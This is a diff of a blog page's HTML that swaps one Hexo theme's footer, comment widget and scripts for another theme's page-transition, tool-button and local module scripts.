-                if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
-                  const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
-                  // Waline 会自动处理主题切换
-                  if (waline) {
-                    waline.update({ dark: isDark ? 'auto' : false });
-                  }
-                }
-              });
-            });
-            
-            observer.observe(document.documentElement, {
-              attributes: true,
-              attributeFilter: ['data-theme']
-            });
-          });
-        };
-        walineScript.src = 'https://unpkg.com/@waline/client@v3/dist/waline.js';
-        document.body.appendChild(walineScript);
-      </script>
-    
-    
-  </div>
-
-      </article>
-    </div>
-  </div>
-</div>
-
-    </div>
-    <footer class="footer">
-  <div class="status-bar">
-    <div class="status-item">
-      <i class="fas fa-code-branch"></i>
-      master
-    </div>
-    <div class="status-item">
-      <i class="fas fa-sync"></i>
-      heart22
-    </div>
-    <div class="status-item">
-      <i class="fas fa-clock"></i>
-      2025-11-03
-    </div>
-    <div class="status-item">
-      Designed By&nbsp; <a href="https://github.com/B143KC47" target="_blank"> BlackCat</a>
-    </div>
-    <div class="status-item github">
-      <a href="#" target="_blank">
-        <i class="fab fa-github"></i>
-      </a>
-    </div>
-  </div>
+    </div>  
 </footer>
+		</div>
+	</div>
 
-    
-    <!-- 全局配置 -->
-    <script>
-      window.HEXO_CONFIG = {
-        language: "en",
-        root: "/"
-      };
-      
-      // 特定于搜索的配置
-      window.VSC4T_SEARCH = {
-        root: "/"
-      };
-    </script>
-    
-    <script src="//cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script src="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="//cdn.jsdelivr.net/npm/highlight.js@11.7.0/highlight.min.js"></script>
-    <script>hljs.highlightAll();</script>
-    <!-- 这里可以放置自定义脚本 -->
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="js/build/libs/Swup.min.js"></script>
+
+<script src="js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="js/build/libs/SwupPreloadPlugin.min.js"></script>
+
 <script>
-document.addEventListener('DOMContentLoaded', (event) => {
-  // Apply smooth scroll to non-TOC anchor links
-  document.querySelectorAll('a[href^="#"]:not(.toc-link)').forEach(anchor => {
-    anchor.addEventListener('click', function (e) {
-      e.preventDefault();
-      // Check if querySelector is valid before using it
-      try {
-        const targetSelector = this.getAttribute('href');
-        // Basic check for potentially invalid selectors (though not exhaustive)
-        if (targetSelector && targetSelector.length > 1) { 
-          const targetElement = document.querySelector(targetSelector);
-          if (targetElement) {
-            targetElement.scrollIntoView({
-              behavior: 'smooth'
-            });
-          } else {
-            console.warn('Smooth scroll target not found:', targetSelector);
-          }
-        } else {
-           console.warn('Invalid href for smooth scroll:', targetSelector);
-        }
-      } catch (error) {
-        console.error('Error during smooth scroll:', error, 'Selector:', this.getAttribute('href'));
-        // Fallback or alternative behavior if needed
-        // For example, try getElementById if it's just an ID
-        const targetId = this.getAttribute('href').slice(1);
-        try {
-            const targetElementById = document.getElementById(decodeURIComponent(targetId));
-            if (targetElementById) {
-                targetElementById.scrollIntoView({ behavior: 'smooth' });
-            }
-        } catch (idError) {
-             console.error('Fallback getElementById also failed:', idError);
-        }
-      }
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-  });
-});
-</script>
-
-<!-- Scripts -->
-<script>
-  // 将语言文件中的翻译传递给前端
-  window.HEXO_CONFIG = {
-    language: "en",
-    search_placeholder: "Type to search...",
-    search_no_results: "No results found",
-    search_result: "result",
-    search_results: "results",
-    search_results_found: "Found undefined results",
-    search_in: "Search in",
-    search_in_title: "Title",
-    search_in_content: "Content",
-    search_in_tags: "Tags",
-    search_in_categories: "Categories",
-    search_filters: "Search Filters",
-    search_recent: "Recent Searches",
-    search_clear: "Clear",
-    search_loading: "Loading...",
-    search_error: "Error loading search data"
-  };
 </script>
 
 
 
-<!-- 添加所有需要的脚本 -->
-<script src="../../../../js/main.js"></script>
-<script src="../../../../js/search.js"></script>
+
+	
+<script src="js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="js/build/utils.js" type="module"></script>
+
+<script src="js/build/main.js" type="module"></script>
+
+<script src="js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="js/build/layouts/categoryList.js" type="module"></script>
 
 
-    <script>
-      // 移动端菜单切换
-      $(document).ready(function() {
-        $('.mobile-menu-toggle').click(function() {
-          $('.sidebar-explorer').toggleClass('show');
-        });
-      });
-    </script>
-  </body>
+
+
+
+    
+<script src="js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="js/build/tools/runtime.js"></script>
+
+    
+<script src="js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="js/build/libs/Typed.min.js"></script>
+
+  
+<script src="js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
 </html>
